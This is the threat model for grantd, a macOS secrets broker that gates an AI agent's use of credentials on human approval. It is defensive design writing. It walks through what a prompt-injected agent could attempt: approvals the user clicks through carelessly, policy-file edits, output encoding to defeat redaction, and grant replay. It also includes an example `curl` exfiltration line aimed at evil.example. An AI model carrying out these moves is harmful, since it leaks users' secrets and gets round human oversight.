# Threat model

This document says what grantd defends, against whom, how, and where it stops working. It describes the code as it is in v0.1 (macOS only). Where a claim rests on something I could not verify, it says so. File references are to this repository.

The one-sentence version: grantd keeps secret values out of an AI agent's context and makes every release visible to a human; the single real security boundary is **human presence at release time**, and that boundary is enforced by the daemon's own logic, not by cryptography, so it holds against an agent that has a shell and a socket (including one that edits the vault file: grant rows are MAC'd), and does not hold against code that can act as the daemon, replace its binary or service definition, or otherwise control your account.

## 1. Assets

| Asset | Where it lives | Notes |
|---|---|---|
| Secret values | AES-256-GCM ciphertext in the `secrets` table of `vault.db` (`internal/vault/secrets.go`, `crypto.go`); plaintext only transiently in the daemon's memory and in an approved child's environment | The GCM additional data binds the name and `min_tier`, so renaming a row or lowering its tier fails to decrypt. |
| Vault key (32 bytes) | In the daemon's memory while it runs; on disk only wrapped by the key store (`vault_meta.wrapped_key`) | Never in a file, an env var or a config in plaintext. Zeroed on `Vault.Close`. |
| Key-store key | Secure Enclave P-256 key (tag `dev.grantd.vault-kek`; needs a properly signed app, so on an unsigned from-source build the fallback is the operative configuration, see 4.3), or with the fallback a 32-byte Keychain item (service `dev.grantd`, account `vault-kek`) | |
| Audit log | `audit` table in the same `vault.db` | HMAC-chained with a key derived from the vault key. |
| Grants | `grants` table in the same `vault.db` | Each row is MAC'd under a key derived from the vault key; forged rows never match. Replay of a genuine old row is not detected. See 4.5. |
| Secret metadata | `tags`, `url`, `notes`, `expires_at` columns | **Plaintext.** Don't put anything sensitive in `notes`. `expires_at` is not covered by the GCM tag. |
| Policy files | `.grantd.yml` in repositories | Writable by whoever can write the repository. |
| The human's attention | | The dialog is only as good as the person reading it. |

## 2. Trust boundaries

```
 agent's shell / MCP client                   daemon                          human presence
 (untrusted, runs as you)             (trusted, runs as you)                  (the only authority)

  grantd CLI ─┐                        ┌───────────────────────────┐
  grantd mcp ─┼── unix socket 0600 ───▶│ peer UID check            │
  any process ┘   same-UID only        │ policy → grants → approver ├────────▶ osascript dialog
                                       │ vault, runner, audit       │          + Touch ID / password
                                       └─────────────┬─────────────┘
                                                     │ env with secrets
                                                     ▼
                                              approved child process
                                              (trusted by your approval)
```

1. **Agent shell to daemon.** The socket is mode 0600 in a directory that grantd created as 0700 (a pre-existing directory is left as it is, with a log warning if group or others can access it), and the daemon checks the peer's UID on every connection (`internal/daemon/peercred*.go`, `socket.go`). Everything on the agent side of this line, including the content of every request field, is untrusted. The daemon validates each request and does no rate limiting, except that it serves at most 64 connections at once (the rest are answered `busy`) and survives running out of file descriptors; a same-user process can still hold those 64 slots open, which is a denial of service the agent can already cause (it can also just press Deny, 4.4). The only request field that carries a secret is `set`'s `value`, which flows into the vault, never out.
2. **Daemon to human.** The daemon asks through the `Approver` interface. The macOS approver reads nothing from the environment, files, stdin or the socket when deciding; the decision is the return value of the system authentication UI (`internal/approve/darwin/doc.go`). If a prompt cannot be shown (no GUI session, no device password, `osascript` failure) the result is an error and a refusal, never an allow.
3. **Daemon to child.** The approved command runs as you with your secrets in its environment. grantd stops being a control here.

## 3. What the controls are

| Control | What it does | Code |
|---|---|---|
| No value-returning op | The broker has no handler that returns a value except `show`. `run` returns only redacted output. The MCP shim has four tools, none returning a value, and a test fails if the package mentions `show`. | `internal/broker`, `internal/mcp` |
| Presence at release | Each `run` without a matching grant requires the dialog (button) and an authentication success. `show` requires them every time and never uses or creates grants. Creating a standing grant (`grants add`) requires its own dialog and authentication (4.7). The three prompts differ in wording and buttons (`approve.Kind`). | `internal/broker/run.go`, `secrets.go`, `standing.go`, `internal/approve/darwin` |
| Tier checks | A secret's `min_tier` must be met by both the key store and the approver, else refuse. Never downgrade. | `broker.tierMet`, `vault.MinTierFor` |
| Policy | Per-repo allow-lists for secret names and argv prefixes, a cap on the dialog's "Allow for N" (`max_grant_ttl`, at most 24h) and an optional cap on standing grants (`max_standing_grant_ttl`). Restricts only. | `internal/policy` |
| Grants | Time-boxed pre-approvals scoped to caller, directory, secret set and argv prefix: dialog grants (at most 24h) and human-created standing grants (at most 90 days). | `internal/grant` |
| Redaction | Exact-match replacement in output and in daemon error text. | `internal/runner/redact.go` |
| Audit | Append-only, HMAC-chained record; an `allowed` row is written before the command is spawned and nothing is started if it cannot be written. | `internal/audit`, `broker.release` |
| Peer-credential check | Only the daemon's own UID may talk to it. | `internal/daemon` |
| Clean child environment | The child gets the daemon's environment, not the caller's. | `internal/runner/run.go` (`buildEnv`) |

## 4. Attacker models

### 4.1 A prompt-injected agent in your shell (the primary case)

*Capabilities assumed:* runs arbitrary commands as your user, talks to the socket directly (not only through `grantd`), reads and writes files in the repository and (as your user) elsewhere, calls the MCP tools, can lie in any request field.

**Stopped**

- *Reading a secret.* There is no op to ask for it. `run` output is redacted. `list`, `exists` and `masked` return metadata, existence and at most the last four characters of values of 12 or more characters.
- *Using a secret silently.* A `run` needs either a fresh approval or a grant you created by approving. Each approval shows the exact `argv`, the working directory and the secret names (with globs expanded to the names they match). The dialog carries the whole command up to 2,000 characters (`MaxDialogArgvRunes`); a longer one shows its first 1,000 and last 1,000 characters around a `[… N characters omitted …]` marker and adds a line giving the full length, so a cut is never silent (the middle of a command longer than that is not visible, so deny anything you cannot account for). The Touch ID sheet has a 250-character budget and cuts the middle of the command, so the dialog is where the command is read.
- *Controlling the child's environment.* The request has no environment field; the child gets the daemon's environment plus the injected variables, so `DYLD_INSERT_LIBRARIES`, `NODE_OPTIONS`, `BASH_ENV`, `LD_PRELOAD`-style tricks and `PATH` games in the agent's own environment do not reach it. (If the daemon was auto-started by the MCP shim, its `PATH` was copied from the shim's environment; see section 7.)
- *Stacking dialogs.* Approver calls are serialised; an unanswered dialog gives up (denies) after 120 seconds; the whole wait is bounded by the approval grace (default 10 minutes).
- *Spoofing the dialog text.* The caller label is rejected if it is over 64 bytes or contains control characters; in the dialog, control and bidi-format characters are replaced, backticks in the command are neutralised, commands over 2,000 characters are cut in the middle with an explicit omitted-characters marker and a stated total length (the Touch ID sheet's shorter text cuts the middle without a marker, which is why the dialog shows the command) and secret names are never dropped. The AppleScript source is a constant; request text is passed as arguments after `--`.

**Not stopped**

- *Asking to run something harmful and hoping you click through.* This is the whole game. The agent chooses the command; you are the filter. Two features make a careless click expensive: **"Allow for N"** (1h by default, up to 24h when the repo's `max_grant_ttl` says so) turns later requests with the same prefix into silent releases, and a **policy prefix like `[sh, -c]`** (or `bash`, `python`, `node`, an interpreter, a build tool that runs repo code) makes that prefix cover arbitrary code. The dialog's "Allow for N covers: <command prefix> … in <directory> and subfolders" line states the scope of the grant before you accept it, and the prefix is the longest matching policy prefix, so a broad policy prefix shows up there as a broad scope. A grant binds to argv text and a directory, not to file contents: if you grant `php artisan` or `./deploy.sh`, the agent can edit those files and the grant still matches.
- *Exfiltration by an approved command.* `curl -d "$API_KEY" https://evil.example` is a perfectly good command. The approval is the control. Redaction is irrelevant to it.
- *Output transformation.* A command that prints `$KEY | rev`, base64, hex or a hash of the value defeats redaction.
- *Writing `.grantd.yml`.* The agent can create or edit a policy in any directory it can write to. Policy lookup uses the **nearest** ancestor and does not merge, so a policy in a subdirectory replaces a stricter one above it (I verified this). A policy still never approves anything, but it widens what can be requested, and it chooses the command prefix of any grant you create (see `matchedPrefix` in `broker/run.go`). The dialog does not show the policy file or its contents, only whether one exists ("(no policy)" when none), and the scope line above. Review `.grantd.yml` changes like code.
- *Set, overwrite, update and delete.* `set` (with or without overwrite), `update`, `delete` and `grants revoke` are not presence-gated: `handleSet`, `handleUpdate` and `handleDelete` in `internal/broker/secrets.go` call the vault directly after name and size validation and write an audit row (`allowed_once` with the verb as reason). An agent can therefore delete every secret (denial of service), replace a secret's value with its own (integrity: your next approved run uses the attacker's value; the old value is destroyed), or revoke your grants (each revocation is audited as `allowed_once` with reason `grants revoke` / `grants revoke_all` and the grant ID, so it is visible afterwards, just not prevented). `update` changes metadata only and never sees the value, but it can clear or extend an expiry without knowing the value (a same-user capability, audited like the rest of this bullet). It can also change `min_tier`: *raising* a secret's minimum protection level needs no approval, but *lowering* it (a `hardware` secret becomes `dialog`, or `none` resolves to a lower vault default) is gated like a release: the daemon shows "Lower the protection of X from hardware to dialog?" (`approve.KindLowerTier`, buttons Cancel and Lower) and then Touch ID, and writes `update: lower min_tier` to the audit log (`handleUpdate`, `confirmLowerTier`). The dialog's last line is the same "Only continue if you just asked for this yourself." as for a standing grant, because any process of yours can send the update that produces it. `set` with `overwrite` can still store a secret under a lower level, but it replaces the value too, so nothing of the old value is exposed by it. This is not a disclosure path. It is a gap against the stated goal of "no silent changes", recorded in BACKLOG.md.
- *Reading history.* `audit list` and `audit export` are available to any socket client; they contain every command line and working directory grantd has seen. `list` returns each secret's `url` and `notes` (the MCP tool omits notes).
- *Prompt fatigue.* An agent that asks twenty times gets twenty chances.
- *Forging a grant in the database.* Rejected by the grant MAC (4.5). Replaying a genuine old grant row is not.
- *Using `show`.* The "TTY only" rule is enforced by the CLI (`cmd/grantd/cmd_show.go` refuses unless stdout is a terminal), not by the daemon. The daemon cannot know what the client's stdout is. Anything that can reach the socket can send a `show` request with an arbitrary `caller` and `cwd`; the argv in the dialog is fixed by the daemon (`grantd show NAME`), so what you see is "a caller wants to run `grantd show NAME`". If you approve a prompt of that form you did not ask for, the value goes to whoever asked. The protection is presence, not the TTY check.

### 4.2 A malicious or buggy approved command

By definition grantd has released the secret. What it does next is up to the command: send it over the network, write it to a file or a log, pass it on the command line of another process (visible to `ps`), put it in a core dump. The injected environment is readable by other processes running as you for as long as the child lives (`ps -Eww` shows it on macOS, which I checked for a non-system binary). On exit the whole process group is killed, but a process that calls `setsid` or daemonises can escape the group and keeps its environment.

grantd's contributions here are only: you saw the command first, a policy can limit which commands may ever be requested for which secrets, and the audit log records that it happened.

### 4.3 A compromised user account

Everything the agent can do (4.1), plus arbitrary code execution as you, which includes the ability to be the daemon's peer in every other sense. Presence is a software check inside the daemon process; it is not bound cryptographically to using the vault key. Concretely:

- **With the Secure Enclave key store** (the macOS default, but not reachable from an unsigned or ad-hoc signed from-source build, where the Keychain fallback below is the operative configuration: MANUAL-TEST-MACOS.md §2a, outcome D) the key is hardware-bound and non-exportable, so it cannot be copied off the machine. It carries **no user-presence flag** (`internal/keystore/darwin/doc.go`, "DECISION"): the access control is `PrivateKeyUsage` only. That is deliberate. The daemon must unwrap the vault key at start (launchd, no UI), and a presence flag would put a Touch ID prompt on every unwrap. The consequence is that the *only* thing between a same-user process and the vault key is the system's check of the calling binary's code-signing identity against the key's access group. `Tier() == hardware` for this key store means "the key is hardware-bound", not "unwrapping needs you". The daemon holds the unwrapped vault key in memory for as long as it runs. **I did not verify** how strong that code-identity check is for an ad-hoc signed binary: an ad-hoc signature costs nothing and any program can claim the same identifier, so if macOS honours `com.apple.application-identifier` as the access group of an ad-hoc binary, any other ad-hoc binary claiming it may be able to use the key. `build/grantd.entitlements` and MANUAL-TEST-MACOS.md §2a record exactly what was and wasn't established. A Developer ID identity with a provisioning profile would bind the group to a team ID; that is not done. I also did not evaluate whether other same-user processes can read the daemon's memory (the `make sign` build does not enable the hardened runtime).
- **With the Keychain fallback** (`TierDialog`) the key-encryption key is an ordinary Keychain generic-password item. Processes running as you can read it (macOS may show a Keychain prompt to a binary other than the one that created the item; I did not test whether that is an effective barrier) and, with the vault file, decrypt every secret offline with no grantd prompt at all. In this mode presence only constrains clients that go through the daemon.
- **Either mode:** an attacker who can write `vault.db` cannot forge a grant (4.5), but can delete the vault, replay a saved genuine grant row, or replace the binary or service definition.

So against a compromised account grantd gives you: an audit trail, a tamper-evident grants table (4.5), secrets that are encrypted at rest and not readable by a different user, and, with the Secure Enclave, a vault key that cannot be exfiltrated to another machine. It does not give you a prompt that an attacker running as you must pass. The handoff's wording is "does NOT protect against a compromised user account with hardware-presence bypass"; the accurate reading is broader than that.

### 4.4 A process with Accessibility permission scripting the dialog

The first dialog is `osascript` `display dialog`, which is ordinary UI. A process on your account that has been granted Accessibility (or can otherwise drive the UI) can click "Allow once" or "Allow for 1h". That is why the Touch ID / password sheet always follows an Allow button, and why a Deny short-circuits before it: the system authentication UI is answered by `coreauthd` and the sensor, not by a button an automation can press. What remains:

- The process can *dismiss* or press Deny (denial of service).
- It can choose between once and for-N, but not complete the authentication. If it also knows your password and can drive the password sheet, it wins; I did not test whether the password sheet is scriptable.
- A lookalike dialog from another process can phish you into touching the sensor for a different prompt. The Touch ID sheet repeats the request text, so read it.
- The same goes for the "Create standing grant" button (4.7): a process that can click it still cannot pass the authentication sheet, but a standing grant is worth much more to an attacker than a one-hour grant, so it matters more that the sheet's text, which says "standing grant ... for 30 days", is read.
- `WithChooser(false)` (not exposed as a flag) would remove the dialog and leave the system sheet alone; the dialog exists to provide the three-way choice and a place to read the command.

### 4.5 An attacker with file-system write access to the vault

(A process running as you qualifies. So does a backup tool, a sync client, or a restore from an untrusted copy.)

What this attacker **cannot** do without the vault key: read or alter a secret value (GCM), forge audit rows with a valid chain (HMAC), forge or edit a grant (HMAC), or move a secret to a weaker tier (the tier is in the GCM data).

What this attacker **can** do:

- **Forge a grant? No longer.** Each `grants` row carries an HMAC-SHA256 under `vault.DeriveKey("grant-mac")` over its id, caller, directory, secrets, command prefix, timestamps, remaining uses and kind (dialog or standing, so one cannot be relabelled as the other; `internal/grant/store.go`). A row inserted or edited without the key fails verification, never matches, is listed as `TAMPERED` by `grantd grants`, is counted in a `WARNING:` line of `grantd status`, and is logged once at WARN. I re-ran the earlier experiment against the current build: an `INSERT` of a forged `**`/`sh` grant (with a junk MAC) left the request denied (exit 77) and produced the `TAMPERED` row and the warning. Before this was added the same `INSERT` released the secret with no prompt, so any code that could write the vault file defeated the presence boundary.
- **Replay a genuine old grant row.** What the MAC does not cover is time: an attacker who copied a real grant row (or the whole file) earlier can write it back, reviving a revoked grant or resetting `uses_remaining`, for as long as the row's own expiry allows. Deleting rows only revokes. There is no counter or anchor to detect replay (BACKLOG.md). Dialog grants are capped at one hour by default (24 hours at most), so that window is bounded, and reviving one needs a copy that was saved while it was valid. **A standing grant widens this window to its whole lifetime** (up to 90 days): a copy of its row saved while it was valid revives it after you revoke it, until it expires. Revoking a standing grant is not final against someone who could write the vault file earlier, which is the replay gap in BACKLOG.md and matters more now.
- **Everything else in this list still works, and a same-user attacker has other routes that the MAC does not touch**: delete the vault, replace the `grantd` binary or the launchd plist, drop a `.grantd.yml` (4.1), change `PATH`-dependent behaviour of the daemon's environment through the plist, or wait for you to approve something. The grants MAC removes one cheap, silent bypass; it does not make a compromised account safe.
- Delete or replace secrets, change `expires_at`, `url`, `notes` and `tags` (not covered by the GCM tag), and change `vault_meta.default_min_tier`.
- Drop the audit triggers and **truncate the newest audit rows**. The chain stays valid because there is no external anchor, so `audit verify` passes. Edits or deletions in the middle are detected.
- Replace the whole file. A vault whose wrapped key the key store cannot unwrap is simply unusable (denial of service).
- `min_tier` as *displayed* by `list` and `Vault.Get` comes straight from the column and is not authenticated; it is authenticated when a secret is decrypted for a release, so a release always uses the real tier.

### 4.6 What the peer-credential check does and doesn't give you

On macOS it reads `LOCAL_PEERCRED` (Linux `SO_PEERCRED`) and requires the connecting process's effective UID to equal the daemon's; any failure to read credentials rejects the connection (`internal/daemon/peercred.go`, tested with a rejecting peer check). It stops other local users and anything running as a different account. It does **not** identify the process: not its PID, binary, code signature or parent. Every process running as you, including the agent, `curl --unix-socket`, and a malicious dependency's postinstall script, is an equally authorised client. It is not a way to separate "Claude Code" from "anything else"; the `caller` field is for display and grant scoping only.

### 4.7 A standing grant the agent asks for

A standing grant (`grantd grants add`, wire op `grants` action `add`) is a grant the human creates up front, for up to 90 days, so that matching runs need no prompt at all. It is the most powerful object grantd can store, so it gets its own rules:

- **Any socket client can send the request, including an agent.** The peer check (4.6) only says "a process of yours". The daemon cannot tell `grantd grants add` typed by you from the same JSON line written by a prompt-injected agent to the socket, and the `grant_caller` it carries is whatever the sender chose. Nothing about the request is trusted: it is validated like a run (absolute existing directory, non-empty secrets and command prefix, names that exist, not expired, tier met) and refused if the nearest `.grantd.yml` forbids those secrets or that command.
- **The defence is the dialog, and then Touch ID.** The prompt is a different dialog from a release (`approve.KindStandingGrant`): it opens with "Create a standing grant?", states the command prefix, the secrets (globs expanded), the directory, the caller as claimed and the duration ("for the next 30 days"), has the single allow button "Create standing grant" with Cancel as the default, and ends with "Only continue if you just asked for this yourself." The authentication sheet that follows repeats "standing grant ... for 30 days". Nothing is stored before both succeed, a denial is audited, and the dialog's own "Allow for N" can never produce a standing grant (the approver's allow must carry exactly the requested duration, or it is treated as a denial). `display dialog` cannot show the duration in large print; it is in the first sentence of the text and of the authentication reason. This is the weakest point: if you click Create on a standing-grant dialog you did not start, you have given that caller, directory and command prefix 90 days of silent access.
- **Ceilings, not clamps.** The lifetime is at most 90 days (`grant.MaxStandingGrantTTL`), and at most the policy's `max_standing_grant_ttl` when the nearest `.grantd.yml` has one. Above that the request is refused (`bad_request`), so what you are asked to approve is what you typed. The policy's `max_grant_ttl` does not apply: that cap is for prompts an agent can trigger at will, and a standing grant is created deliberately. A policy file is written by whoever can write the repository, so `max_standing_grant_ttl` can only tighten the 90-day ceiling.
- **The grant itself is as strong as any other, for longer.** It binds to the caller label (untrusted), the directory, the secrets as requested and the argv text, not to the contents of what runs (4.1, 5). Every release through it is an ordinary audited `allowed_grant`; its creation is one `allowed_new_grant` row with reason `standing`, and if that row cannot be written the grant is revoked again. `grantd grants` marks standing grants; `grants revoke` removes one (not presence-gated, and an agent can also revoke, which only costs you a prompt).

Advice: create standing grants for narrow command prefixes in specific directories, with the shortest TTL that suits and `--uses` where a count fits; never for a shell or interpreter prefix; look at `grantd grants` now and then.

## 5. Specific design facts to keep in mind

- **Exact-match redaction only.** See README "Redaction". It is a net for accidents (`env`, `printenv`, a stack trace that prints a header). It never stops a command that wants the value out.
- **The `caller` string is untrusted.** The CLI sends `cli` or `--caller`; the MCP shim sends the client's self-reported name. Any process can send any label. Grants include the caller in their match, so a grant created for `claude-code` can be used by any process that says it is `claude-code`; in practice a grant is scoped by directory, secrets and command prefix, and the caller label is cosmetic. For a standing grant this is the main thing to keep in mind: for up to 90 days, any same-user process that sends that label, in that directory, with that command prefix, gets the secrets with no prompt.
- **Working-directory symlinks.** The broker resolves symlinks in `cwd` (`filepath.EvalSymlinks`) before it does anything else: the policy search, grant matching, the dialog text and the child's working directory all use the real path, and a grant stores the real path as its prefix. A symlink inside the project cannot make a grant for `/a/proj` apply to `/etc`, and a policy lookup cannot be steered through a symlink. Matching of the (resolved) `cwd` against a grant is lexical on path components, so a grant covers the directory and everything beneath it, including directories created later.
- **argv text, not program identity.** The dialog and the grant show `argv` as typed. `argv[0]` is resolved on the child's `PATH` at run time (the daemon's `PATH`), so `php` is whichever `php` is first. Nothing pins a binary hash.
- **The key is only usable while the session is unlocked, and the daemon waits.** The Secure Enclave key that wraps the vault key can only be used while you are logged in and the Mac is unlocked; on a locked screen or early after login macOS refuses with `errSecInteractionNotAllowed` (`-25308`). If the daemon starts then, it does not exit: it keeps the socket up, answers every op `failed`/`vault_locked` and retries opening the vault with backoff until the keystore works again. The data key is never held anywhere else to bridge the gap, so while the Mac is locked nothing can be released, which is the intended behaviour. Only transient statuses (`-25308`, `-25315`, `-25320`) are retried; `-25293` (`errSecAuthFailed`) is not, because it cannot be told apart from the keystore refusing this binary, and any other error (wrong keystore mode, tampered file, tier downgrade) still stops the daemon at start.
- **Presence enforced by the approver, not by the key.** The Secure Enclave key has no presence flag; the Touch ID prompt is a gate in the daemon's code. It is a real gate against everything that goes through the daemon.
- **Audit-before-spawn.** The `allowed` row (reason `released`) is written after the secrets have been decrypted in the daemon's memory and before the command is started, and a failed write means nothing is started, so the log cannot lag behind a release. A crash between the two rows leaves a `released` row with no `completed` row. Both rows are scrubbed of injected values.
- **Audit rows are bounded.** Every request field is untrusted, and a request refused as malformed is audited too, so `audit.Append` caps each field (a command line at 64 KiB of JSON, `cwd` at 4 KiB, `caller` at 64 bytes; PROTOCOL.md lists them) and marks a cut with `(truncated)`. Without this one refused request with a multi-megabyte argv element made the log unlistable. The price: the audit of an approved command with more than 64 KiB of arguments holds only its first part (the dialog shows an abbreviated command line as well). The daemon log clips `caller` and `cwd` to 200 bytes.
- **Metadata is plaintext.** Secret names, tags, URLs, notes and expiries are visible to anyone who can read `vault.db`. The names appear in the audit log, the dialog, MCP `secret_list` and the daemon log.
- **Daemon log contents.** Operational logs include the op, caller, `cwd`, the number of argv elements and the outcome of every request. They never include request bodies, values or `argv` (the daemon has no redactor; the audit table keeps `argv` with injected values scrubbed). An agent that puts a credential on a command line still puts it in the audit table if it is not a value grantd injected.
- **`masked` leaks.** Four characters of a 12-or-more-character value are returned to any socket client with no prompt. For a low-entropy or structured secret that can matter.

## 6. What the key controls do and do not stop (summary)

| Control | Stops | Does not stop |
|---|---|---|
| No value-returning op | An agent asking for a secret | Anything via an approved command; `show` approved by a confused human |
| Presence at release | Silent use through the daemon; silent use via a forged grant row | Replay of a saved genuine grant row; being the daemon (or replacing the binary); an approver-clicking you |
| Standing-grant dialog (`grants add`) | A standing grant appearing without a dialog that says "standing grant", the duration and the scope, followed by authentication; a duration above the ceiling | An agent asking for the dialog while you are at the Mac and clicking Create; use of a standing grant by any process claiming the caller label, for up to 90 days |
| Policy | A repo requesting names or commands it shouldn't | An agent that can write a nearer `.grantd.yml`; broad prefixes such as `[sh, -c]` |
| Grants (MAC'd rows) | Prompt fatigue for repeated identical work; forged or edited rows; relabelling a dialog grant as a standing one | Replay of a saved genuine row within its TTL (up to 90 days for a standing grant); edits to the files a granted command runs; use by any process claiming the same caller |
| Redaction | Accidental echo of a value | Encoded, transformed, partial or out-of-band output |
| Audit chain | Edits and mid-log deletions by anyone without the key | Truncation of the newest rows |
| Peer UID check | Other local users | Any process running as you |
| Secure Enclave key (not available on an unsigned from-source build; the Keychain fallback row below applies there) | Moving the vault key to another machine | A same-user process that can use the key (unverified), the daemon's own memory |
| Keychain fallback | A different user, and a stolen vault file alone | Any process running as you with login-keychain access |

## 7. Operational advice that follows from this

- Review `.grantd.yml` changes in code review. Keep command prefixes narrow and never list a shell or interpreter.
- Prefer "Allow once" for commands you haven't seen before; use "Allow for N" for narrow, repeated work in a repository whose contents you trust.
- Press Cancel on any "Create a standing grant?" dialog you did not start with `grantd grants add`. Prefer a short `--ttl`, a narrow command prefix and a specific `--cwd`; check `grantd grants` for entries marked `standing`.
- Run `grantd status` now and then: a `WARNING:` line means grant rows failed authentication, i.e. the vault file was edited outside grantd. `grantd grants` shows them as `TAMPERED`; revoke them.
- Put a `.grantd.yml` in every repository so an agent can only request the secrets that repository needs. Without one, any secret in the vault can be requested (with approval).
- Treat the Keychain fallback as a convenience tier, not a security tier.
- Start the daemon from a service or a clean shell. A daemon auto-started by the MCP shim inherits `PATH` from the agent's environment.
- Don't run `grantd_dev` builds against real secrets (their key store is a constant, public key).
